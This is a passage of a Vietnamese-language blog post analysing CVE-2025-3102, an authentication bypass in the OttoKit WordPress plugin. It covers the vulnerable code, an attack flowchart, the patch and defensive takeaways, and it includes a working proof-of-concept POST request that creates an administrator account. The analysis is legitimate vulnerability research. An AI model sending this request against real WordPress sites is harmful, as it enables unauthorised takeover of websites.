</span></span><span class="line"><span class="cl">    <span class="nv">$add_user_roles</span> <span class="o">=</span> <span class="nv">$selected_options</span><span class="p">[</span><span class="s1">&#39;add_user_roles&#39;</span><span class="p">]</span> <span class="o">?</span> <span class="s1">&#39;yes&#39;</span> <span class="o">:</span> <span class="s1">&#39;no&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$show_password</span>  <span class="o">=</span> <span class="nv">$selected_options</span><span class="p">[</span><span class="s1">&#39;show_password&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nv">$user</span> <span class="o">=</span> <span class="nx">get_user_by</span><span class="p">(</span> <span class="s1">&#39;email&#39;</span><span class="p">,</span> <span class="nv">$email</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="o">!</span> <span class="nv">$user</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$user</span> <span class="o">=</span> <span class="nx">get_user_by</span><span class="p">(</span> <span class="s1">&#39;login&#39;</span><span class="p">,</span> <span class="nv">$user_name</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="nv">$user</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="o">...</span>
</span></span><span class="line"><span class="cl">        <span class="nx">wp_update_user</span><span class="p">(</span> <span class="nx">wp_slash</span><span class="p">(</span> <span class="nv">$userdata</span> <span class="p">)</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line hl"><span class="cl">        <span class="nv">$user_id</span> <span class="o">=</span> <span class="nx">wp_insert_user</span><span class="p">(</span> <span class="nx">wp_slash</span><span class="p">(</span> <span class="nv">$userdata</span> <span class="p">)</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="o">...</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table></div><div class="code-expand-btn" aria-label="Mở rộng hoặc thu gọn khối mã" role="button"><i class="fa-solid fa-angles-down" aria-hidden="true"></i></div>
</div>
</div><p>Hàm này lấy các tham số đầu vào từ request, thực hiện chuẩn hóa dữ liệu (email, username, mật khẩu), sau đó kiểm tra xem người dùng đã tồn tại trong hệ thống hay chưa thông qua <strong>email</strong> và <strong>username</strong>. Nếu người dùng chưa tồn tại, hàm sẽ tạo mới tài khoản bằng <code>wp_insert_user</code>; ngược lại, nếu đã tồn tại, hệ thống sẽ cập nhật thông tin người dùng tương ứng.</p>
<p>Theo luồng phân tích trên, toàn bộ các tham số đầu vào đều có thể bị attacker kiểm soát thông qua request. Điều này cho phép kẻ tấn công chủ động truyền dữ liệu tùy ý, bao gồm cả trường <strong><code>role</code></strong>. Khi hàm <code>_action_listener()</code> được thực thi, hệ thống sẽ tạo mới người dùng với role do attacker chỉ định, từ đó có thể tạo tài khoản với quyền <strong>administrator</strong>, dẫn đến chiếm quyền kiểm soát toàn bộ website.</p>
<p>Bản vá <code>v1.0.78</code> đã bổ sung kiểm tra chặt chẽ giá trị của <code>secret_key</code> trước khi so sánh</p>
<p><figure><a class="lightgallery" target="_blank" href="/posts/2026-01-14-cve-2025-3102/patch.png" title="Bản vá" data-thumbnail="/posts/2026-01-14-cve-2025-3102/patch.png" data-sub-html="<h2>Patch</h2><p>Bản vá</p>"><img loading="lazy" src='/posts/2026-01-14-cve-2025-3102/patch.png' alt="Patch" height="446" width="1004"></a><figcaption class="image-caption">Bản vá</figcaption>
  </figure></p>
<p>Bao gồm xác thực kiểu dữ liệu, kiểm tra rỗng đối với cả header nhận từ request và giá trị <code>secret_key</code> được cấu hình trong hệ thống. Ngoài ra, hàm so sánh được thay thế bằng <code>hash_equals()</code> để tránh rò rỉ thông tin qua timing attack. Nhờ đó, trường hợp plugin chưa được cấu hình API key hoặc request không truyền header hợp lệ sẽ bị từ chối ngay, ngăn chặn khả năng bypass xác thực.</p>
<h2 class="heading-element" id="flow"><span>Flow</span>
  <a href="#flow" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><div class="diagram-container">
  <pre class="mermaid">flowchart TD
A["Attacker (Unauthenticated)"]
--> B["Send crafted HTTP request to<br/>/wp-json/sure-triggers/v1/automation/action"]

B --> C["WordPress REST Router"]

C --> D["permission_callback:<br/>autheticate_user($request)"]

D --> E{"Plugin configured API key ?"}
E -- No (secret_key = null) --> F["$secret_key from header = null"]
F --> G["null !== null → false"]
G --> H["Authentication BYPASS"]

E -- Yes --> X["Normal authentication flow"]

H --> I["callback:<br/>run_action($request)"]

I --> J["Extract params via get_param():<br/>integration, type_event, selected_options, fields, context"]

J --> K{"integration & type_event valid ?"}
K -- No --> Y["Return error"]
K -- Yes --> L["Skip wp_user_email validation if not provided"]

L --> M["Load registered actions:<br/>EventController::get_instance()->actions"]

M --> N["Resolve action:<br/>actions[integration][type_event]"]

N --> O["Prepare function parameters"]

O --> P["call_user_func_array(action_function, params)"]

P --> Q["_action_listener() executed"]

Q --> R["Read user_email, user_name, password, role from attacker-controlled input"]

R --> S{"User exists ?"}
S -- Yes --> T["wp_update_user()"]
S -- No --> U["wp_insert_user() with attacker-controlled role"]

U --> V["New WordPress user created"]

V --> W["Privilege escalation / Full site compromise"]</pre>
  <pre class="mermaid-dark">flowchart TD
A["Attacker (Unauthenticated)"]
--> B["Send crafted HTTP request to<br/>/wp-json/sure-triggers/v1/automation/action"]

B --> C["WordPress REST Router"]

C --> D["permission_callback:<br/>autheticate_user($request)"]

D --> E{"Plugin configured API key ?"}
E -- No (secret_key = null) --> F["$secret_key from header = null"]
F --> G["null !== null → false"]
G --> H["Authentication BYPASS"]

E -- Yes --> X["Normal authentication flow"]

H --> I["callback:<br/>run_action($request)"]

I --> J["Extract params via get_param():<br/>integration, type_event, selected_options, fields, context"]

J --> K{"integration & type_event valid ?"}
K -- No --> Y["Return error"]
K -- Yes --> L["Skip wp_user_email validation if not provided"]

L --> M["Load registered actions:<br/>EventController::get_instance()->actions"]

M --> N["Resolve action:<br/>actions[integration][type_event]"]

N --> O["Prepare function parameters"]

O --> P["call_user_func_array(action_function, params)"]

P --> Q["_action_listener() executed"]

Q --> R["Read user_email, user_name, password, role from attacker-controlled input"]

R --> S{"User exists ?"}
S -- Yes --> T["wp_update_user()"]
S -- No --> U["wp_insert_user() with attacker-controlled role"]

U --> V["New WordPress user created"]

V --> W["Privilege escalation / Full site compromise"]</pre>
  <pre class="mermaid-neutral">flowchart TD
A["Attacker (Unauthenticated)"]
--> B["Send crafted HTTP request to<br/>/wp-json/sure-triggers/v1/automation/action"]

B --> C["WordPress REST Router"]

C --> D["permission_callback:<br/>autheticate_user($request)"]

D --> E{"Plugin configured API key ?"}
E -- No (secret_key = null) --> F["$secret_key from header = null"]
F --> G["null !== null → false"]
G --> H["Authentication BYPASS"]

E -- Yes --> X["Normal authentication flow"]

H --> I["callback:<br/>run_action($request)"]

I --> J["Extract params via get_param():<br/>integration, type_event, selected_options, fields, context"]

J --> K{"integration & type_event valid ?"}
K -- No --> Y["Return error"]
K -- Yes --> L["Skip wp_user_email validation if not provided"]

L --> M["Load registered actions:<br/>EventController::get_instance()->actions"]

M --> N["Resolve action:<br/>actions[integration][type_event]"]

N --> O["Prepare function parameters"]

O --> P["call_user_func_array(action_function, params)"]

P --> Q["_action_listener() executed"]

Q --> R["Read user_email, user_name, password, role from attacker-controlled input"]

R --> S{"User exists ?"}
S -- Yes --> T["wp_update_user()"]
S -- No --> U["wp_insert_user() with attacker-controlled role"]

U --> V["New WordPress user created"]

V --> W["Privilege escalation / Full site compromise"]</pre><div class="diagram-copy-btn" aria-label="Copy Mermaid code" role="button"><i class="fa-regular fa-clone" aria-hidden="true"></i></div>
<template><pre>flowchart TD
A["Attacker (Unauthenticated)"]
--> B["Send crafted HTTP request to<br/>/wp-json/sure-triggers/v1/automation/action"]

B --> C["WordPress REST Router"]

C --> D["permission_callback:<br/>autheticate_user($request)"]

D --> E{"Plugin configured API key ?"}
E -- No (secret_key = null) --> F["$secret_key from header = null"]
F --> G["null !== null → false"]
G --> H["Authentication BYPASS"]

E -- Yes --> X["Normal authentication flow"]

H --> I["callback:<br/>run_action($request)"]

I --> J["Extract params via get_param():<br/>integration, type_event, selected_options, fields, context"]

J --> K{"integration & type_event valid ?"}
K -- No --> Y["Return error"]
K -- Yes --> L["Skip wp_user_email validation if not provided"]

L --> M["Load registered actions:<br/>EventController::get_instance()->actions"]

M --> N["Resolve action:<br/>actions[integration][type_event]"]

N --> O["Prepare function parameters"]

O --> P["call_user_func_array(action_function, params)"]

P --> Q["_action_listener() executed"]

Q --> R["Read user_email, user_name, password, role from attacker-controlled input"]

R --> S{"User exists ?"}
S -- Yes --> T["wp_update_user()"]
S -- No --> U["wp_insert_user() with attacker-controlled role"]

U --> V["New WordPress user created"]

V --> W["Privilege escalation / Full site compromise"]</pre></template>
</div><h2 class="heading-element" id="proof-of-concept-poc"><span>Proof of Concept (PoC)</span>
  <a href="#proof-of-concept-poc" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><ol>
<li>Gửi request:</li>
</ol>
<div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
<div class="code-header language-http"><span class="code-title"><i class="arrow fa-solid fa-chevron-down fa-fw" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h fa-fw" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="Chuyển đổi số dòng" role="button" title="Chuyển đổi số dòng"><i class="fa-solid fa-list-ol fa-fw" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="Chuyển đổi xuống dòng" role="button" title="Chuyển đổi xuống dòng"><i class="fa-solid fa-right-left fa-fw" aria-hidden="true"></i></span><span class="copy-btn" aria-label="Sao chép vào bộ nhớ tạm" role="button" title="Sao chép vào bộ nhớ tạm"><i class="fa-regular fa-clone fa-fw" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="1" style="--fi-max-shown-lines:10;--fi-line-digit:1;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="nf">POST</span> <span class="nn">/wp-json/sure-triggers/v1/automation/action</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
</span></span><span class="line"><span class="cl"><span class="n">Host</span><span class="o">:</span> <span class="l">localhost</span>
</span></span><span class="line"><span class="cl"><span class="n">st_authorization</span><span class="o">:</span> <span class="l">Bearer </span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="g">wp_user_id=1&amp;integration=WordPress&amp;type_event=create_user_if_not_exists&amp;selected_options[user_name]=hacker&amp;selected_options[password]=hacker&amp;selected_options[role]=administrator&amp;selected_options[user_email]=hacker@gmail.com&amp;selected_options[first_name]=hacker</span></span></span></code></pre></td></tr></table></div>
</div>
</div><p><figure><a class="lightgallery" target="_blank" href="/posts/2026-01-14-cve-2025-3102/result.png" title="Result" data-thumbnail="/posts/2026-01-14-cve-2025-3102/result.png" data-sub-html="<h2>Result</h2><p>Result</p>"><img loading="lazy" src='/posts/2026-01-14-cve-2025-3102/result.png' alt="Result" height="1089" width="2175"></a><figcaption class="image-caption">Result</figcaption>
  </figure></p>
<ol start="2">
<li>Login với user vừa tạo</li>
</ol>
<h2 class="heading-element" id="conclusion"><span>Conclusion</span>
  <a href="#conclusion" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><p>CVE-2025-3102 là một lỗ hổng <strong>authentication bypass</strong> trong plugin WordPress OttoKit (≤ 1.0.78), bắt nguồn từ việc thiếu kiểm tra giá trị rỗng của <code>secret_key</code> trong hàm <code>autheticate_user()</code>. Khi plugin được cài đặt nhưng chưa cấu hình API key, request với header rỗng có thể vượt qua bước xác thực.</p>
<p>Sau khi bypass thành công, attacker có thể truy cập trực tiếp endpoint <code>run_action()</code> và kiểm soát toàn bộ tham số đầu vào. Bằng cách kích hoạt action <code>create_user_if_not_exists</code>, kẻ tấn công có thể tạo tài khoản mới với role tùy ý, bao gồm cả quyền administrator, dẫn đến chiếm quyền kiểm soát website.</p>
<p>Phiên bản 1.0.79 đã khắc phục vấn đề bằng cách kiểm tra chặt chẽ dữ liệu đầu vào và sử dụng <code>hash_equals()</code> để so sánh an toàn, ngăn chặn khả năng bypass xác thực.</p>
<h2 class="heading-element" id="key-takeaways"><span>Key Takeaways</span>
  <a href="#key-takeaways" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><ul>
<li>Logic xác thực cần luôn kiểm tra đầy đủ giá trị rỗng và kiểu dữ liệu.</li>
<li>Cơ chế xác thực phải mặc định từ chối khi trạng thái không hợp lệ hoặc chưa cấu hình.</li>
<li>Việc thực thi hàm động dựa trên dữ liệu từ request làm tăng đáng kể bề mặt tấn công.</li>
<li>Các tham số nhạy cảm như role không nên được phép kiểm soát trực tiếp từ phía client.</li>
<li>Cần kiểm thử cả các kịch bản sai cấu hình, không chỉ trường hợp hoạt động bình thường.</li>
<li>Luôn cập nhật plugin lên phiên bản đã được vá để giảm thiểu rủi ro bảo mật.</li>
</ul>
<h2 class="heading-element" id="references"><span>References</span>
  <a href="#references" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><p><a href="https://patchstack.com/academy/wordpress/vulnerabilities/privilege-escalation/" target="_blank" rel="external nofollow noopener noreferrer">Bypass Vulnerability</a></p>
<p><a href="https://patchstack.com/database/wordpress/plugin/suretriggers/vulnerability/wordpress-suretriggers-plugin-1-0-78-authorization-bypass-vulnerability" target="_blank" rel="external nofollow noopener noreferrer">WordPress OttoKit Plugin &lt;= 1.0.78 is vulnerable to a high priority Bypass Vulnerability</a></p></div><hr class="awesome-hr" />
    <h2 id="see-also">Nội dung liên quan</h2>
    <ul><li>
          <a href="/vi/posts/2026-01-22-cve-2025-11707/" title="CVE-2025-11707 Analysis &amp; POC">CVE-2025-11707 Analysis &amp; POC</a></li><li>
          <a href="/vi/posts/2026-01-15-cve-2025-12788/" title="CVE-2025-12788 Analysis &amp; POC">CVE-2025-12788 Analysis &amp; POC</a></li><li>
          <a href="/vi/posts/2026-01-13-cve-2025-6688/" title="CVE-2025-4796 Analysis &amp; POC">CVE-2025-4796 Analysis &amp; POC</a></li><li>
          <a href="/vi/posts/2026-01-12-cve-2025-4796/" title="CVE-2025-4796 Analysis &amp; POC">CVE-2025-4796 Analysis &amp; POC</a></li><li>
          <a href="/vi/posts/2026-01-11-cve-2025-8059/" title="CVE-2025-8059 Analysis &amp; POC">CVE-2025-8059 Analysis &amp; POC</a></li><li>
          <a href="/vi/posts/2026-01-08-cve-2025-14156/" title="CVE-2025-2563 Analysis &amp; POC">CVE-2025-2563 Analysis &amp; POC</a></li><li>
          <a href="/vi/posts/2026-01-07-cve-2025-2563/" title="CVE-2025-2563 Analysis &amp; POC">CVE-2025-2563 Analysis &amp; POC</a></li><li>
          <a href="/vi/posts/2026-01-06-cve-2025-7654/" title="CVE-2025-7654 Analysis &amp; POC">CVE-2025-7654 Analysis &amp; POC</a></li><li>
          <a href="/vi/posts/2026-01-05-cve-2025-55707/" title="CVE-2025-53425 Analysis &amp; POC">CVE-2025-53425 Analysis &amp; POC</a></li><li>
          <a href="/vi/posts/2026-01-04-cve-2025-53425/" title="CVE-2025-53425 Analysis &amp; POC">CVE-2025-53425 Analysis &amp; POC</a></li></ul><div class="post-footer" id="post-footer">
  <div class="post-info">
    <div class="post-info-line">
      <div class="post-info-mod"><span title="Cập nhật ngày 2026-01-14 07:40:48">Cập nhật ngày 2026-01-14&nbsp;<a class="git-hash" href="https://github.com/w41bu1/w41bu1.github.io/commit/c40d6321c735ae6035dba54f196e2a37fe32f0ef" rel="external nofollow noopener noreferrer" target="_blank" title="Update&#10&#10Commit: c40d6321c735ae6035dba54f196e2a37fe32f0ef [c40d6321]&#10Author: w41bu1&#10Date: 2026-01-14 07:40:48"><i class="fa-solid fa-hashtag fa-fw" aria-hidden="true"></i>c40d6321</a></span>
      </div><div class="post-info-license">
            <span><a rel="license external nofollow noopener noreferrer" href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a></span>
          </div></div><div class="post-info-line">
        <div class="post-info-md"><span><a href="/vi/posts/2026-01-14-cve-2025-3102/index.md" title="Đọc với định dạng Markdown" class="link-to-markdown">Đọc với định dạng Markdown</a></span><span><a href="https://github.com/w41bu1/w41bu1.github.io/blob/main/content/posts/2026-01-14-CVE-2025-3102/index.vi.md?plain=1" title="Xem mã nguồn" target="_blank" rel="external nofollow noopener noreferrer" class="link-to-source">Xem mã nguồn</a></span><span><a href="https://github.com/w41bu1/w41bu1.github.io/edit/main/content/posts/2026-01-14-CVE-2025-3102/index.vi.md" title="Chỉnh sửa trang này" target="_blank" rel="external nofollow noopener noreferrer" class="link-to-edit">Chỉnh sửa trang này</a></span><span><a href="https://github.com/w41bu1/w41bu1.github.io/issues/new?title=[BUG]%20CVE-2025-3102&#43;Analysis&#43;%26&#43;POC&amp;body=%7cField%7cValue%7c%0A%7c-%7c-%7c%0A%7cTitle%7cCVE-2025-3102&#43;Analysis&#43;%26&#43;POC%7c%0A%7cURL%7chttp://localhost:1313/vi/posts/2026-01-14-cve-2025-3102/%7c%0A%7cFilename%7chttps://github.com/w41bu1/w41bu1.github.io/blob/main/content/posts/2026-01-14-CVE-2025-3102/index.vi.md?plain=1%7c" title="Báo cáo lỗi" target="_blank" rel="external nofollow noopener noreferrer" class="link-to-report">Báo cáo lỗi</a></span><span><a href="vscode://file//home/w41/Project/w41bu1.github.io/content/posts/2026-01-14-CVE-2025-3102/index.vi.md" title="Mở trong trình chỉnh sửa" target="_blank" rel="external nofollow noopener noreferrer" class="link-to-vscode">Mở trong trình chỉnh sửa</a></span></div>
        <div class="post-info-share">
          <span><a href="javascript:void(0);" title="Chia sẻ trên X" data-sharer="twitter" data-url="http://localhost:1313/vi/posts/2026-01-14-cve-2025-3102/" data-title="CVE-2025-3102 Analysis &amp; POC" data-hashtags="analyst,plugin,Bypass Vulnerability"><i class="fa-brands fa-x-twitter fa-fw" aria-hidden="true"></i></a>
  <a href="javascript:void(0);" title="Chia sẻ trên Facebook" data-sharer="facebook" data-url="http://localhost:1313/vi/posts/2026-01-14-cve-2025-3102/" data-hashtag="analyst"><i class="fa-brands fa-facebook-square fa-fw" aria-hidden="true"></i></a>
  <a href="javascript:void(0);" title="Chia sẻ trên Linkedin" data-sharer="linkedin" data-url="http://localhost:1313/vi/posts/2026-01-14-cve-2025-3102/"><i class="fa-brands fa-linkedin fa-fw" aria-hidden="true"></i></a>
  <a href="javascript:void(0);" title="Chia sẻ trên Hacker News" data-sharer="hackernews" data-url="http://localhost:1313/vi/posts/2026-01-14-cve-2025-3102/" data-title="CVE-2025-3102 Analysis &amp; POC"><i class="fa-brands fa-hacker-news fa-fw" aria-hidden="true"></i></a>
  </span>
        </div>
      </div></div>

  <div class="post-info-more">
    <section class="post-tags"><i class="fa-solid fa-tags fa-fw me-1" aria-hidden="true"></i><a href="/vi/tags/analyst/" class="post-tag" title="Nhãn - Analyst">Analyst</a><a href="/vi/tags/plugin/" class="post-tag" title="Nhãn - Plugin">Plugin</a><a href="/vi/tags/bypass-vulnerability/" class="post-tag" title="Nhãn - Bypass Vulnerability">Bypass Vulnerability</a></section>
    <section><span><a href="javascript:void(0);" onclick="window.history.back();">Quay lại</a></span>&nbsp;|&nbsp;<span><a href="/vi/">Trang chủ</a></span>
    </section>
  </div><div class="post-nav"><a href="/vi/posts/2026-01-13-cve-2025-6688/" class="post-nav-item" rel="prev" title="CVE-2025-4796 Analysis &amp; POC"><i class="fa-solid fa-angle-left fa-fw" aria-hidden="true"></i>CVE-2025-4796 Analysis &amp; POC</a><a href="/vi/posts/2026-01-15-cve-2025-12788/" class="post-nav-item" rel="next" title="CVE-2025-12788 Analysis &amp; POC">CVE-2025-12788 Analysis &amp; POC<i class="fa-solid fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
</div>
</article>

  <aside class="toc" id="toc-auto" aria-label="Nội dung"><h2 class="toc-title">Nội dung&nbsp;<i class="toc-icon fa-solid fa-angle-down fa-fw" aria-hidden="true"></i></h2>
      <div class="toc-content always-active" id="toc-content-auto"></div></aside><dialog id="toc-dialog" aria-labelledby="toc-dialog-title" role="dialog">
      <div class="toc">
        <h2 class="toc-title">Nội dung</h2>
        <div class="toc-content" id="toc-content-drawer"><nav >
  <ul>
    <li><a href="#cve--basic-info">CVE &amp; Basic Info</a></li>
    <li><a href="#requirements">Requirements</a></li>
    <li><a href="#analysis">Analysis</a></li>
    <li><a href="#flow">Flow</a></li>
    <li><a href="#proof-of-concept-poc">Proof of Concept (PoC)</a></li>
    <li><a href="#conclusion">Conclusion</a></li>
    <li><a href="#key-takeaways">Key Takeaways</a></li>
    <li><a href="#references">References</a></li>
  </ul>
</nav></div>
      </div>
    </dialog></main><footer class="footer">
    <div class="footer-container"><div class="footer-line copyright" itemscope itemtype="http://schema.org/CreativeWork"><i class="fa-regular fa-copyright fa-fw" aria-hidden="true"></i>
            <span itemprop="copyrightYear">2026</span><span class="author" itemprop="copyrightHolder">
              <a href="github.com/w41bu1">Bui Van Y</a></span><span class="license footer-divider">w41bu1</span></div><div class="footer-line statistics"></div><div class="footer-line visitor">
          <span id="busuanzi_container_site_uv" title='Tổng khách truy cập'><i class="fa-regular fa-user fa-fw me-1" aria-hidden="true"></i><span id="busuanzi_value_site_uv"><i class="fa-solid fa-spinner fa-spin fa-fw" aria-hidden="true"></i></span></span><span id="busuanzi_container_site_pv" class="footer-divider" title='Tổng lượt truy cập'><i class="fa-regular fa-eye fa-fw me-1" aria-hidden="true"></i><span id="busuanzi_value_site_pv"><i class="fa-solid fa-spinner fa-spin fa-fw" aria-hidden="true"></i></span></span>
        </div><div class="footer-line beian"><span class="gov"><i class="fa-solid fa-user-secret"></i></span><span class="icp footer-divider"><i class="fa-solid fa-bug"></i></span></div></div>
  </footer></div><div class="widgets"><div class="fixed-buttons"><div class="fixed-button back-to-top animate__faster d-none" role="button" aria-label="Lên trên"><i class="fa-solid fa-arrow-up fa-fw" aria-hidden="true"></i><svg viewBox="0 0 100 100">
              <circle class="bg" cx="50" cy="50" r="50"></circle>
              <circle class="progress" cx="50" cy="50" r="50"></circle>
            </svg></div><div id="toc-drawer-button" class="fixed-button toc-drawer-button d-none" role="button" aria-label="Nội dung"><i class="fa-solid fa-bars fa-fw" aria-hidden="true"></i></div></div><div id="mask"></div><noscript>
    <div class="noscript-warning">Trang web này hoạt động tốt nhất khi JavaScript được kích hoạt.</div>
  </noscript>
</div><link rel="stylesheet" href="/lib/lightgallery/css/lightgallery-bundle.min.css"><link rel="stylesheet" href="/lib/pace/themes/blue/pace-theme-minimal.css"><script src="/lib/autocomplete/autocomplete.min.js" defer></script><script src="/lib/fuse/fuse.min.js" defer></script><script src="/lib/lightgallery/lightgallery.min.js" defer></script><script src="/lib/lightgallery/plugins/thumbnail/lg-thumbnail.min.js" defer></script><script src="/lib/lightgallery/plugins/zoom/lg-zoom.min.js" defer></script><script src="/lib/sharer/sharer.min.js" async defer></script><script src="/lib/typeit/index.umd.js" defer></script><script src="/lib/cell-watermark/watermark.min.js" defer></script><script src="/lib/pace/pace.min.js" async defer></script><script src="/vi/js/config/994377caf5cdfac91f469f593b5c715f.js" defer></script><script src="/js/lib/mermaid.js" type="module"></script><script src="/js/theme.min.js" defer></script><script src="/js/flyfish.min.js" defer></script></body>
</html>
